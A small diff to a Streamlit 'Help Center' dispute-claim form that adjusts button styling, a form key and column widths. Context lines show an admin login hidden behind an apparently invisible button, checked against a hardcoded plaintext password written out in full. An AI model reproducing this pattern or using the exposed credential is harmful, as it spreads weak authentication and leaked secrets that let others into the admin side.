@@ -64,6 +64,7 @@ st.markdown("""<style>
         border: none !important;
         font-weight: 600 !important;
         width: 100% !important;
+        height: 45px !important;
     }
 
     div.stButton > button[key="ghost_dot"] {
@@ -81,7 +82,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
     
-    with st.form("claim_v32_4_8", clear_on_submit=True):
+    with st.form("claim_v32_4_9", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -99,8 +100,8 @@ else:
     with st.container():
         pw = st.text_input("Auth Key", type="password", label_visibility="collapsed", placeholder="Auth Key")
         
-        # Alineación Horizontal de botones
-        btn_cols = st.columns([2, 1])
+        # Botones estrictamente horizontales
+        btn_cols = st.columns([3, 1])
         with btn_cols[0]:
             if st.button("CHECK"): 
                 if pw == "Diostieneelpoder1": st.session_state.logged_in = True
